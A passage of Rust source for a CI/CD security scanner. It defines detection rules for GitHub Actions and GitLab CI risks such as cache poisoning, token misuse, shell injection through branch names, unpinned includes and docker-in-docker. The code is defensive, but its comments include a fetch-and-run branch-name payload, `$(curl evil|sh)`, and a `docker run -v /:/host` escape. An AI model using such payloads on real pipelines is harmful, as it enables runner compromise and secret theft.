    let mut findings = Vec::new();

    // Pre-compute whether the workflow holds non-default authority.
    // Two ways to qualify:
    //  (a) any step has access to a non-GITHUB_TOKEN Secret or Identity, OR
    //  (b) any GITHUB_TOKEN identity has a non-default write permission.
    let workflow_has_extra_secrets = graph.authority_sources().any(|n| match n.kind {
        NodeKind::Secret => true,
        NodeKind::Identity => {
            // GITHUB_TOKEN identities are named `GITHUB_TOKEN` or
            // `GITHUB_TOKEN (<job>)`. Anything else is extra authority
            // (cloud OIDC, ADO service connection, …).
            !n.name.starts_with("GITHUB_TOKEN")
        }
        _ => false,
    });

    let workflow_has_token_writes = graph
        .nodes_of_kind(NodeKind::Identity)
        .filter(|n| n.name.starts_with("GITHUB_TOKEN"))
        .any(|n| {
            n.metadata
                .get(META_PERMISSIONS)
                .map(|p| {
                    let s = p.to_lowercase();
                    s.contains("write") || s == "write-all"
                })
                .unwrap_or(false)
        });

    if !(workflow_has_extra_secrets || workflow_has_token_writes) {
        return findings;
    }

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(action_ref) = step.metadata.get(META_INTERACTIVE_DEBUG) else {
            continue;
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::InteractiveDebugActionInAuthorityWorkflow,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' uses interactive debug action '{action_ref}' inside a workflow that holds non-default secrets or write permissions — a successful debug session forwards the runner's full environment over SSH",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Move the debug action into a separate workflow with no secret access and `permissions: read-all`, OR gate the step on an explicit short-lived `workflow_dispatch` input that is removed after use. Never run tmate/upterm in a workflow that holds production credentials.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// R9 — PR-specific cache key in a default-branch consumer.
///
/// Severity: Medium. Speculative rule from the council gap report; the corpus
/// did not show a perfect example, so we emit Medium and document the risk.
/// A PR build that writes to a cache keyed on `github.head_ref` /
/// `github.event.pull_request.head.ref` / `github.actor` populates an entry
/// that a later default-branch run can restore — letting an attacker poison
/// the build cache from a fork PR.
pub fn pr_specific_cache_key_in_default_branch_consumer(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Trigger gate: workflow must run on `push` (default branch) AND on a
    // PR-context trigger. Without the push side, the cache write never gets
    // restored by a privileged consumer; without the PR side, no untrusted
    // contributor can populate the cache to begin with.
    let triggers = graph.metadata.get(META_TRIGGERS);
    let runs_on_push = triggers_contain_any(triggers, &["push"]);
    let runs_on_pr = triggers_contain_any(triggers, &["pull_request", "pull_request_target"]);
    if !(runs_on_push && runs_on_pr) {
        return findings;
    }

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(key) = step.metadata.get(META_CACHE_KEY) else {
            continue;
        };
        if key.is_empty() {
            continue;
        }
        // Detect PR-derived key fragments. Match common spelling variants.
        let lower = key.to_lowercase();
        let is_pr_keyed = lower.contains("github.head_ref")
            || lower.contains("github.event.pull_request.head.ref")
            || lower.contains("github.event.pull_request.head.sha")
            || lower.contains("github.actor")
            || lower.contains("github.triggering_actor");
        if !is_pr_keyed {
            continue;
        }

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::PrSpecificCacheKeyInDefaultBranchConsumer,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' caches with a PR-derived key ('{key}') in a workflow that also runs on push — a fork PR can poison the cache that the default-branch build later restores",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Split the workflow so the `actions/cache` save side runs only on `push: branches: [main]` (or another protected ref) and PR runs use cache restore-only with `lookup-only: true`. Alternatively, key the cache on the file hashes that determine its content, not the branch or actor.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// R10 — `gh` / `gh api` runtime escalation with the default GITHUB_TOKEN.
///
/// Severity: Medium. Static permission checks see only the declared
/// `permissions:` block — they miss runtime calls that use the token to
/// perform write-class operations the workflow shouldn't be doing in a
/// PR-triggered context. Detects `gh ` invocations that mutate state
/// (`pr merge`, `release create/upload`, `api -X POST/PATCH/PUT/DELETE`)
/// in workflows triggered by `pull_request`, `issue_comment`, or
/// `workflow_run`.
pub fn gh_cli_with_default_token_escalating(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Trigger gate.
    let triggers = graph.metadata.get(META_TRIGGERS);
    let risky_trigger = triggers_contain_any(
        triggers,
        &[
            "pull_request",
            "pull_request_target",
            "issue_comment",
            "workflow_run",
            "pull_request_review",
            "pull_request_review_comment",
        ],
    );
    if !risky_trigger {
        return findings;
    }

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(body) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        if body.is_empty() {
            continue;
        }
        if !body_contains_gh_cli(body) {
            continue;
        }
        let Some(verb) = detect_gh_escalating_verb(body) else {
            continue;
        };

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::GhCliWithDefaultTokenEscalating,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' invokes `gh {verb}` against the default GITHUB_TOKEN inside a workflow triggered by an untrusted context — runtime privilege escalation that static permission checks miss",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Move write-class `gh`/`gh api` calls into a separate workflow gated on `push` (or an explicit reusable workflow with `secrets: inherit` only for the writer side). On the PR-triggered side, enforce `permissions: read-all` and verify by re-reading the GitHub Actions audit log.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// True when `body` invokes the `gh` CLI as a command (not just mentions
/// the substring `gh` inside another word). Match `gh ` at start of line, after
/// `;`, after `&&`, after `|`, or following indentation/whitespace.
fn body_contains_gh_cli(body: &str) -> bool {
    for line in body.lines() {
        let trimmed = line.trim_start();
        if trimmed.starts_with("gh ") || trimmed.starts_with("gh\t") {
            return true;
        }
        // Inline forms after a shell separator.
        for sep in ["&& gh ", "|| gh ", "; gh ", "$(gh ", "`gh ", "| gh "] {
            if trimmed.contains(sep) {
                return true;
            }
        }
    }
    false
}

/// If `body` invokes a write-class `gh` verb, return a short label for it.
/// Recognised:
///   - `gh pr merge`
///   - `gh release create` / `gh release upload` / `gh release delete`
///   - `gh api -X POST|PATCH|PUT|DELETE` (any path)
///   - `gh api ... <method>` against `/repos/.../{contents,releases,actions/secrets,environments}`
fn detect_gh_escalating_verb(body: &str) -> Option<String> {
    let lower = body.to_lowercase();
    if lower.contains("gh pr merge") {
        return Some("pr merge".into());
    }
    if lower.contains("gh release create") {
        return Some("release create".into());
    }
    if lower.contains("gh release upload") {
        return Some("release upload".into());
    }
    if lower.contains("gh release delete") {
        return Some("release delete".into());
    }
    if lower.contains("gh release edit") {
        return Some("release edit".into());
    }
    // `gh api -X <METHOD>` form. Match the method tokens directly so we don't
    // false-positive on `-X-Foo` headers etc.
    for method in ["post", "patch", "put", "delete"] {
        let needle_dash = format!("gh api -x {method}");
        let needle_long = format!("gh api --method {method}");
        if lower.contains(&needle_dash) || lower.contains(&needle_long) {
            return Some(format!("api -X {}", method.to_uppercase()));
        }
    }
    // Path-based heuristic: even without an explicit -X, certain endpoints are
    // mutation endpoints (`gh api repos/.../actions/secrets/FOO -F ...`).
    let path_markers = [
        "actions/secrets",
        "actions/variables",
        "/environments",
        "/releases",
    ];
    if lower.contains("gh api ") && path_markers.iter().any(|m| lower.contains(m)) {
        // Only escalate when there's also a write-flag. `-f`/`-F`/`--field`/`--input`
        // implies POST/PATCH semantics under `gh api`.
        let writes = lower.contains(" -f ")
            || lower.contains(" -f=")
            || lower.contains(" -f\"")
            || lower.contains(" --field")
            || lower.contains(" --input");
        if writes {
            return Some("api (mutation endpoint)".into());
        }
    }
    None
}

// ── GitLab CI rules ─────────────────────────────────────────

/// Untrusted GitLab CI predefined variables that an attacker can control by
/// pushing a branch / opening an MR / writing a commit message. When any of
/// these is interpolated into an unquoted shell expansion the runner
/// executes whatever the attacker put inside `` $(...) `` or backticks.
const UNTRUSTED_GITLAB_CI_VARS: &[&str] = &[
    "CI_COMMIT_BRANCH",
    "CI_COMMIT_REF_NAME",
    "CI_COMMIT_TAG",
    "CI_COMMIT_MESSAGE",
    "CI_COMMIT_TITLE",
    "CI_COMMIT_DESCRIPTION",
    "CI_COMMIT_AUTHOR",
    "CI_MERGE_REQUEST_TITLE",
    "CI_MERGE_REQUEST_DESCRIPTION",
    "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME",
];

/// Rule: `$CI_JOB_TOKEN` (the GitLab platform-injected job token, broad scope
/// by default — registry write, package upload, project read) used as a
/// bearer credential against an external HTTP endpoint, or fed to
/// `docker login` for `registry.gitlab.com`.
///
/// Detection: read the Step's `META_SCRIPT_BODY`. Fire when the body
/// contains `$CI_JOB_TOKEN` or `${CI_JOB_TOKEN}` AND any of:
/// - a `curl` / `wget` / `http` / `https.request` invocation, OR
/// - the literal `gitlab-ci-token:` (the token-as-Basic-auth idiom), OR
/// - a `docker login` for `registry.gitlab.com`.
///
/// Severity: High. Category: Credentials.
pub fn ci_job_token_to_external_api(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let body = match step.metadata.get(META_SCRIPT_BODY) {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };

        if !body_references_ci_job_token(body) {
            continue;
        }

        let sink = classify_ci_job_token_sink(body);
        let Some(sink) = sink else {
            continue;
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::CiJobTokenToExternalApi,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' uses $CI_JOB_TOKEN as a bearer credential ({}) — the token's default scope (registry write, package upload, project read) means a poisoned MR job that emits it can pivot to package or registry pushes",
                step.name, sink
            ),
            recommendation: Recommendation::Manual {
                action: "Scope CI_JOB_TOKEN: in Settings → CI/CD → Job token permissions, set the inbound allowlist to the minimum projects required and disable any unused scope (package_registry, container_registry). For uploads, prefer a dedicated short-lived deploy token over CI_JOB_TOKEN. Never POST CI_JOB_TOKEN to webhooks or third-party APIs.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

fn body_references_ci_job_token(body: &str) -> bool {
    body.contains("$CI_JOB_TOKEN") || body.contains("${CI_JOB_TOKEN}")
}

/// Classify how `$CI_JOB_TOKEN` is being used. Returns a short human-readable
/// sink description, or None when the token only appears in benign ways
/// (e.g. assignment to an env var that's never read).
fn classify_ci_job_token_sink(body: &str) -> Option<&'static str> {
    let lower = body.to_lowercase();
    // gitlab-ci-token:$CI_JOB_TOKEN — the canonical Basic-auth idiom.
    if lower.contains("gitlab-ci-token:") && body_references_ci_job_token(body) {
        if lower.contains("docker login") && lower.contains("registry.gitlab.com") {
            return Some("docker login registry.gitlab.com");
        }
        if lower.contains("curl") || lower.contains("wget") {
            return Some("curl/wget Basic auth (user gitlab-ci-token)");
        }
        return Some("Basic-auth credential (user gitlab-ci-token)");
    }
    // JOB-TOKEN: header form (curl/wget against /api/v4/...).
    if lower.contains("job-token:") && body_references_ci_job_token(body) {
        return Some("JOB-TOKEN header to GitLab API");
    }
    // curl --header "PRIVATE-TOKEN: $CI_JOB_TOKEN" or similar bearer use.
    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("authorization:") || lower.contains("private-token:"))
        && body_references_ci_job_token(body)
    {
        return Some("Authorization/PRIVATE-TOKEN header to HTTP endpoint");
    }
    // Generic: token appears next to a CI_API_V4_URL request — strong signal.
    if body.contains("CI_API_V4_URL") && body_references_ci_job_token(body) {
        return Some("HTTP request to ${CI_API_V4_URL} with token");
    }
    None
}

/// Rule: GitLab `id_tokens:` audience reused across MR-context and
/// protected-context jobs in the same file (no audience separation), or set
/// to a wildcard / multi-cloud broker URL, or shared with a `secrets:` Vault
/// path that the consuming job doesn't need.
///
/// Detection: collect every OIDC Identity node (Identity with
/// `META_OIDC == "true"`) carrying a `META_OIDC_AUDIENCE`. For each audience:
/// - Wildcard / `*` audience → fire (b).
/// - Same audience reachable from at least one Step marked `META_TRIGGER ==
///   merge_request` AND at least one Step that is NOT (i.e. protected-context
///   only) → fire (a).
///
/// Severity: High. Category: Privilege.
pub fn id_token_audience_overscoped(graph: &AuthorityGraph) -> Vec<Finding> {
    use std::collections::HashMap as Map;

    let mut findings = Vec::new();

    // Collect (audience → (identity_id, [step_ids that reach it])).
    let mut by_aud: Map<&str, Vec<(NodeId, Vec<NodeId>)>> = Map::new();

    for ident in graph.nodes_of_kind(NodeKind::Identity) {
        let is_oidc = ident.metadata.get(META_OIDC).map(String::as_str) == Some("true");
        if !is_oidc {
            continue;
        }
        let Some(aud) = ident.metadata.get(META_OIDC_AUDIENCE) else {
            continue;
        };
        if aud == "unknown" || aud.is_empty() {
            continue;
        }

        // Find steps that hold this identity via HasAccessTo.
        let mut consumers: Vec<NodeId> = Vec::new();
        for step in graph.nodes_of_kind(NodeKind::Step) {
            let holds = graph
                .edges_from(step.id)
                .any(|e| e.kind == EdgeKind::HasAccessTo && e.to == ident.id);
            if holds {
                consumers.push(step.id);
            }
        }
        by_aud
            .entry(aud.as_str())
            .or_default()
            .push((ident.id, consumers));
    }

    for (aud, entries) in &by_aud {
        // (b) Wildcard / suspiciously broad audience.
        let is_wildcard = *aud == "*"
            || aud.contains("/*")
            || aud.eq_ignore_ascii_case("any")
            || aud.eq_ignore_ascii_case("default");
        if is_wildcard {
            // Use the first identity node as the anchor.
            if let Some((ident_id, consumers)) = entries.first() {
                let mut nodes_involved = vec![*ident_id];
                nodes_involved.extend(consumers.iter().copied());
                findings.push(Finding {
                    severity: Severity::High,
                    category: FindingCategory::IdTokenAudienceOverscoped,
                    path: None,
                    nodes_involved,
                    message: format!(
                        "OIDC id_token audience '{aud}' is wildcard / catch-all — any cloud / Vault role bound to this audience is reachable from every job that mints the token"
                    ),
                    recommendation: Recommendation::Manual {
                        action: "Replace the wildcard `aud:` with a job- or environment-specific audience (e.g. `vault.gitlab.net/prod-deploy`, `aws-deploy-staging`). Bind the downstream role / Vault path to that exact audience so unrelated jobs can't trade the token for the same credential.".into(),
                    },
                    source: FindingSource::BuiltIn,
                    extras: FindingExtras::default(),
                });
                continue;
            }
        }

        // (a) Same audience reachable from MR-context AND non-MR-context steps.
        let all_consumers: Vec<NodeId> = entries
            .iter()
            .flat_map(|(_, c)| c.iter().copied())
            .collect();
        let mut has_mr = false;
        let mut has_protected = false;
        for sid in &all_consumers {
            let Some(step) = graph.node(*sid) else {
                continue;
            };
            if step.metadata.get(META_TRIGGER).map(String::as_str) == Some("merge_request") {
                has_mr = true;
            } else {
                has_protected = true;
            }
        }
        if has_mr && has_protected && !entries.is_empty() {
            // Anchor at the first identity node carrying this audience.
            let (ident_id, _) = &entries[0];
            let mut nodes_involved = vec![*ident_id];
            nodes_involved.extend(all_consumers.iter().copied());
            findings.push(Finding {
                severity: Severity::High,
                category: FindingCategory::IdTokenAudienceOverscoped,
                path: None,
                nodes_involved,
                message: format!(
                    "OIDC id_token audience '{aud}' is shared across merge_request_event jobs and protected-branch jobs — a poisoned MR can mint a token with the same audience as the production deploy and trade it for the same downstream cloud / Vault role"
                ),
                recommendation: Recommendation::Manual {
                    action: "Split audiences by trust context: declare a separate `aud:` for MR-context jobs (e.g. `…/mr-validate`) and a different `aud:` for protected-branch jobs (e.g. `…/prod-deploy`). Bind each downstream role / Vault path to the exact audience of the job that needs it.".into(),
                },
                source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
            });
        }
    }

    findings
}

/// Rule: untrusted GitLab predefined variable interpolated unquoted into a
/// shell context (`script:` / `before_script:` / `after_script:` /
/// `environment:url:`). A branch named `` $(curl evil|sh) `` then runs as
/// part of the runner.
///
/// Detection: for each Step, scan `META_SCRIPT_BODY` and `META_ENVIRONMENT_URL`
/// for any of `UNTRUSTED_GITLAB_CI_VARS` referenced via `$VAR`, `${VAR}`, or
/// `"$VAR"`/`"${VAR}"` (double-quoted — still expanded). A reference inside
/// single quotes does NOT fire. Same for `printf %q` / `${VAR@Q}` /
/// `${VAR//[^A-Za-z0-9]/}` sanitised forms.
///
/// Severity: High. Category: Injection.
pub fn untrusted_ci_var_in_shell_interpolation(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let mut hits: Vec<&str> = Vec::new();
        let mut where_hit: Vec<&str> = Vec::new();

        if let Some(body) = step.metadata.get(META_SCRIPT_BODY) {
            for var in UNTRUSTED_GITLAB_CI_VARS {
                if shell_body_unsafely_expands(body, var) {
                    hits.push(*var);
                    where_hit.push("script");
                }
            }
        }
        if let Some(url) = step.metadata.get(META_ENVIRONMENT_URL) {
            for var in UNTRUSTED_GITLAB_CI_VARS {
                if url_interpolates_var(url, var) {
                    if !hits.contains(var) {
                        hits.push(*var);
                    }
                    if !where_hit.contains(&"environment.url") {
                        where_hit.push("environment.url");
                    }
                }
            }
        }

        if hits.is_empty() {
            continue;
        }

        // Dedup hit list while preserving order.
        let mut seen = std::collections::HashSet::new();
        let names: Vec<&str> = hits.into_iter().filter(|n| seen.insert(*n)).collect();
        let mut wh = where_hit;
        wh.sort();
        wh.dedup();
        let where_str = wh.join(" + ");
        let names_str = names.join(", ");

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::UntrustedCiVarInShellInterpolation,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' interpolates attacker-controlled GitLab predefined variable(s) [{}] into {} without single-quote isolation — a branch / tag / commit message containing `$(...)` executes inside the runner",
                step.name, names_str, where_str
            ),
            recommendation: Recommendation::Manual {
                action: "Pass the untrusted value through the step's `variables:` / `env:` block (one variable per step), then reference it inside the script as `\"$BRANCH\"` (double-quoted is fine when the value is bound to a real shell variable, not YAML-interpolated). For commands that must include the value, sanitise with `printf %q` or `${VAR//[^A-Za-z0-9_-]/}` first. For `environment:url:`, never interpolate `$CI_COMMIT_*` directly — use a slug-only variable (`$CI_COMMIT_REF_SLUG` is sanitised by GitLab).".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Returns true if `body` contains an *unsafe* expansion of `$VAR` / `${VAR}`
/// — i.e. one that is NOT enclosed in single quotes and NOT obviously
/// sanitised. Conservative: errs on the side of flagging because the cost of
/// a false negative (RCE) dwarfs the cost of a false positive (one extra
/// review comment).
fn shell_body_unsafely_expands(body: &str, var: &str) -> bool {
    // First check that the variable appears at all.
    let dollar = format!("${var}");
    let dollar_brace = format!("${{{var}}}");
    if !body.contains(&dollar) && !body.contains(&dollar_brace) {
        return false;
    }

    // Walk lines. A line that's entirely single-quoted around the var is
    // safe; otherwise we need to be conservative.
    for line in body.lines() {
        let line = line.trim_start_matches(['-', ' ', '\t']);
        if line.is_empty() || line.starts_with('#') {
            continue;
        }

        let candidate_positions: Vec<usize> = line
            .match_indices(&dollar)
            .map(|(i, _)| i)
            .chain(line.match_indices(&dollar_brace).map(|(i, _)| i))
            .collect();

        for pos in candidate_positions {
            // Reject if the var reference is wrapped in single quotes
            // (count single-quote occurrences strictly before `pos`; odd
            // count means we're inside a single-quoted region).
            let prefix = &line[..pos];
            let single_count = prefix.matches('\'').count();
            if single_count % 2 == 1 {
                continue; // inside '...'
            }
            // Reject if line has obvious sanitiser around the var.
            if line.contains("printf %q")
                || line.contains("${") && (line.contains("@Q}") || line.contains("//[^"))
            {
                // Sanitiser keyword present somewhere — be safe and skip.
                continue;
            }
            return true;
        }
    }
    false
}

fn url_interpolates_var(url: &str, var: &str) -> bool {
    let dollar = format!("${var}");
    let dollar_brace = format!("${{{var}}}");
    url.contains(&dollar) || url.contains(&dollar_brace)
}

// ── GitLab CI rules ─────────────────────────────────────
//
// Five rules sourced from the v0.9.0 GitLab corpus gap analysis (council
// review of 277 .gitlab-ci.yml files). Detection inputs come from metadata
// stamped by `taudit-parse-gitlab` — see `META_GITLAB_*` constants. Each rule
// is a no-op on graphs from non-GitLab parsers (the markers will simply be
// absent), so wiring all five into `run_all_rules` is safe.

/// Mutable branch names used as `ref:` on includes — anyone with push to one
/// of these on the source repo can backdoor every consumer's pipeline.
const MUTABLE_BRANCH_REFS: &[&str] = &[
    "main", "master", "develop", "dev", "trunk", "default", "HEAD",
];

/// Mid-string fragments inside a `remote:` URL that betray a branch ref
/// (vs a tag or sha). GitLab raw URLs use `/-/raw/<ref>/<path>`.
fn remote_url_uses_branch(url: &str) -> Option<String> {
    // Look for `/-/raw/<ref>/` patterns; ref is the segment after `/-/raw/`.
    let idx = url.find("/-/raw/")?;
    let after = &url[idx + "/-/raw/".len()..];
    let ref_seg = after.split('/').next()?;
    if ref_seg.is_empty() {
        return None;
    }
    // Tags / SHAs aren't mutable: a 40-hex string is a sha; a `v\d+...` or
    // contains `.` and digits is a tag-ish convention. Branches are everything else.
    if ref_seg.len() == 40 && ref_seg.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    if ref_seg.starts_with('v')
        && ref_seg
            .chars()
            .nth(1)
            .map(|c| c.is_ascii_digit())
            .unwrap_or(false)
    {
        return None;
    }
    Some(ref_seg.to_string())
}

/// Rule: `unpinned_include_remote_or_branch_ref` (High, Supply Chain).
///
/// Top-level GitLab `include:` of a `remote:` URL pinned to a branch, a
/// `project:` whose `ref:` is a mutable branch (main/master/develop/...), or
/// an include with no `ref:` at all (defaults to HEAD on the source repo).
///
/// Skips `local:` includes (same repo — same trust boundary), `template:`
/// includes (GitLab-maintained), and `component:` includes that have an `@`
/// version pin. Reads the structured `META_GITLAB_INCLUDES` blob the parser
/// stamps on the graph.
pub fn unpinned_include_remote_or_branch_ref(graph: &AuthorityGraph) -> Vec<Finding> {
    use taudit_parse_gitlab_include_view::IncludeView;

    let blob = match graph.metadata.get(META_GITLAB_INCLUDES) {
        Some(s) => s,
        None => return Vec::new(),
    };
    let entries: Vec<IncludeView> = match serde_json::from_str(blob) {
        Ok(e) => e,
        Err(_) => return Vec::new(),
    };

    let mut findings = Vec::new();

    for entry in entries {
        let kind = entry.kind.as_str();
        let target = entry.target.as_str();
        let git_ref = entry.git_ref.as_str();

        match kind {
            // local / template / component — skip (or handled separately for
            // unversioned components).
            "local" | "template" => continue,
            "component" => {
                if git_ref.is_empty() {
                    // Anchor: kind + target — distinguishes multiple
                    // unpinned `component:` includes in one .gitlab-ci.yml
                    // (ISC-19).
                    findings.push(Finding {
                        severity: Severity::High,
                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
                        path: None,
                        nodes_involved: vec![],
                        message: format!(
                            "include: component '{target}' has no version pin (no '@<version>') — owner of the component repo can rewrite every consumer's pipeline silently"
                        ),
                        recommendation: Recommendation::PinAction {
                            current: target.to_string(),
                            pinned: format!("{target}@<sha-or-tag>"),
                        },
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::with_anchor(format!("component:{target}")),
                    });
                }
            }
            "remote" => {
                if let Some(branch) = remote_url_uses_branch(target) {
                    findings.push(Finding {
                        severity: Severity::High,
                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
                        path: None,
                        nodes_involved: vec![],
                        message: format!(
                            "include: remote URL pins branch '{branch}' ({target}) — included YAML executes with consumer's CI_JOB_TOKEN and secrets; whoever controls that branch can backdoor this pipeline"
                        ),
                        recommendation: Recommendation::PinAction {
                            current: target.to_string(),
                            pinned: target.replacen(
                                &format!("/-/raw/{branch}/"),
                                "/-/raw/<full-sha>/",
                                1,
                            ),
                        },
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::with_anchor(format!("remote:{target}#{branch}")),
                    });
                }
            }
            "project" => {
                let lower = git_ref.to_ascii_lowercase();
                let is_branch = MUTABLE_BRANCH_REFS
                    .iter()
                    .any(|b| b.eq_ignore_ascii_case(&lower));
                let missing = git_ref.is_empty();
                let is_sha = git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit());
                if (missing || is_branch) && !is_sha {
                    let why = if missing {
                        "no `ref:` (defaults to HEAD on source project)".to_string()
                    } else {
                        format!("`ref: {git_ref}` is a mutable branch")
                    };
                    findings.push(Finding {
                        severity: Severity::High,
                        category: FindingCategory::UnpinnedIncludeRemoteOrBranchRef,
                        path: None,
                        nodes_involved: vec![],
                        message: format!(
                            "include: project '{target}' — {why}; included YAML can redefine every job's `script:` and runs with consumer's secrets"
                        ),
                        recommendation: Recommendation::PinAction {
                            current: format!(
                                "project: {target}{}",
                                if missing {
                                    String::new()
                                } else {
                                    format!(", ref: {git_ref}")
                                }
                            ),
                            pinned: format!("project: {target}, ref: <full-commit-sha>"),
                        },
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::with_anchor(format!("project:{target}@{git_ref}")),
                    });
                }
            }
            _ => {}
        }
    }

    findings
}

/// Rule: `dind_service_grants_host_authority` (High, Privilege).
///
/// A GitLab job that declares a `services: [docker:*-dind]` sidecar AND
/// holds at least one secret (other than the implicit, structurally-present
/// CI_JOB_TOKEN). The dind sidecar exposes the full Docker socket inside
/// the job container, so a malicious build step can `docker run -v /:/host`
/// and read the runner host filesystem.
pub fn dind_service_grants_host_authority(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let has_dind = step
            .metadata
            .get(META_GITLAB_DIND_SERVICE)
            .map(|v| v == "true")
            .unwrap_or(false)
            || graph.edges_from(step.id).any(|edge| {
                edge.kind == EdgeKind::UsesImage
                    && graph
                        .node(edge.to)
                        .map(|image| {
                            image.kind == NodeKind::Image && image_ref_is_dind(&image.name)
                        })
                        .unwrap_or(false)
            });
        if !has_dind {
            continue;
        }

        // Walk this step's HasAccessTo edges for secrets / non-implicit
        // identities. The implicit CI_JOB_TOKEN does not count — every job
        // has it by platform design, so flagging on it would emit noise on
        // every dind job.
        let mut sensitive: Vec<String> = Vec::new();
        for edge in graph.edges_from(step.id) {
            if edge.kind != EdgeKind::HasAccessTo {
                continue;
            }
            let target = match graph.node(edge.to) {
                Some(n) => n,
                None => continue,
            };
            let is_implicit = target
                .metadata
                .get(META_IMPLICIT)
                .map(|v| v == "true")
                .unwrap_or(false);
            if is_implicit {
                continue;
            }
            match target.kind {
                NodeKind::Secret => sensitive.push(target.name.clone()),
                NodeKind::Identity => sensitive.push(target.name.clone()),
                _ => {}
            }
        }

        if sensitive.is_empty() {
            continue;
        }

        sensitive.sort();
        sensitive.dedup();
        // Cap the message length — corpora include jobs with dozens of vars.
        let preview = if sensitive.len() > 4 {
            format!(
                "{} (and {} more)",
                sensitive[..4].join(", "),
                sensitive.len() - 4
            )
        } else {
            sensitive.join(", ")
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::DindServiceGrantsHostAuthority,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' uses a docker:dind service AND holds secrets [{}] — a malicious build step can `docker run -v /:/host` from inside dind and exfiltrate the runner's filesystem (other jobs' artifacts, cached creds)",
                step.name, preview
            ),
            recommendation: Recommendation::Manual {
                action: "Replace docker-in-docker with kaniko / buildah / img for image builds (no privileged sidecar required), OR isolate the dind job to a dedicated runner pool with no shared workspace and no other secrets in scope.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

fn image_ref_is_dind(image: &str) -> bool {
    let lower = image.to_ascii_lowercase();
    let Some((name, tag_or_digest)) = lower.split_once(':') else {
        return false;
    };
    name.ends_with("docker") && tag_or_digest.contains("dind")
}

/// Substrings (case-insensitive) that identify a GitLab security scanner job
/// either by job name or by an `extends:` template name.
const SCANNER_PATTERNS: &[&str] = &[
    "sast",
    "dast",
    "secret_detection",
    "secret-detection",
    "dependency_scanning",
    "dependency-scanning",
    "container_scanning",
    "container-scanning",
    "gitleaks",
    "trivy",
    "grype",
    "semgrep",
    "bandit",
    "snyk",
    "license_scanning",
    "license-scanning",
    "iac_scan",
    "iac-scan",
    "fuzz",
    "api_fuzzing",
    "api-fuzzing",
    "coverage_fuzzing",
    "coverage-fuzzing",
];

fn step_matches_scanner(step_name: &str, extends: Option<&String>) -> bool {
    let lower = step_name.to_ascii_lowercase();
    if SCANNER_PATTERNS.iter().any(|p| lower.contains(p)) {
        return true;
    }
    if let Some(ext) = extends {
        let elower = ext.to_ascii_lowercase();
        if SCANNER_PATTERNS.iter().any(|p| elower.contains(p)) {
            return true;
        }
    }
    false
}

/// Rule: `security_job_silently_skipped` (Medium, Configuration).
///
/// A security-scanner job (matched by name or `extends:` template) runs with
/// `allow_failure: true` and no `rules:` clause that surfaces the failure.
/// The pipeline goes green even when the scan errors out — silent-pass is
/// worse than no scan because reviewers trust the badge.
///
/// We can't statically prove the absence of a "surface failures" rule from
/// YAML alone, so we fire whenever `allow_failure: true` is set on a scanner
/// job and let the operator confirm. The recommendation guides them to the
/// fix.
pub fn security_job_silently_skipped(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let allow_failure = step
            .metadata
            .get(META_GITLAB_ALLOW_FAILURE)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !allow_failure {
            continue;
        }

        let extends = step.metadata.get(META_GITLAB_EXTENDS);
        if !step_matches_scanner(&step.name, extends) {
            continue;
        }

        let how = match extends {
            Some(e) => format!("matched by extends: {e}"),
            None => "matched by job name".to_string(),
        };

        findings.push(Finding {
            severity: Severity::Medium,
            category: FindingCategory::SecurityJobSilentlySkipped,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
